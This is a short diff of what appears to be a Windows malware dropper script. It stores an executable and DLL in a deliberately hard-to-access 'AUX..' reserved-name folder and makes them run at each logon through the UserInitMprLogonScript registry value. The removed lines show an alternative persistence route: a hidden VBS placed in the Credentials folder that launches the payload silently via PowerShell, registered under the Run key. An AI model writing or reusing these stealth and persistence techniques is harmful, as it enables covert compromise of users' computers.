@@ -24,10 +24,6 @@ mkdir \\.\%ProgramData%\AUX..\
 move /Y "%ProgramData%\O\Icon.dll" "\\.\%ProgramData%\AUX..\"
 move /Y "%ProgramData%\O\Input.exe" "\\.\%ProgramData%\AUX..\"
 
-echo Set dchell = WScript.CreateObject("WScript.Shell") >> %AppData%\Microsoft\Credentials\nur.vbs
-echo Dchell.Run("powershell.exe C:\ProgramData\AUX..\Input.exe C:\ProgramData\AUX..\Icon.dll"), 0, True >> %AppData%\Microsoft\Credentials\nur.vbs
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Default /t REG_SZ /d "%AppData%\Microsoft\Credentials\nur.vbs" /f
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" /f
 
 chcp 65001 >nul
